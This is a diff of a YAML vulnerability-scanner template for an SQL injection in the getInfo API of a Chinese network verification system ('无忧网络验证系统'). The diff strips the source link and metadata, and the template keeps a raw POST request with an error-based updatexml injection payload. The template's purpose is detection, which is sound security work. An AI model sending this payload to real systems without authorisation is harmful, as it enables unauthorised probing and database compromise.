@@ -3,13 +3,8 @@ info:
   name: 无忧网络验证系统 getInfo SQL注入
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/huayqgzanz9ocbwp
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: huayqgzanz9ocbwp
 http:
 - raw:
   - 'POST /index.php/api/Software/getInfo HTTP/1.1
@@ -37,9 +32,6 @@ http:
 
 
     data=1&id=1 and updatexml(1,concat(0x7e,md5(12345),0x7e),1)
-
-
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1717058228309-50dbc66d-1204-426f-9723-d64ddd46a317.png)
 
 
     ## 修复建议
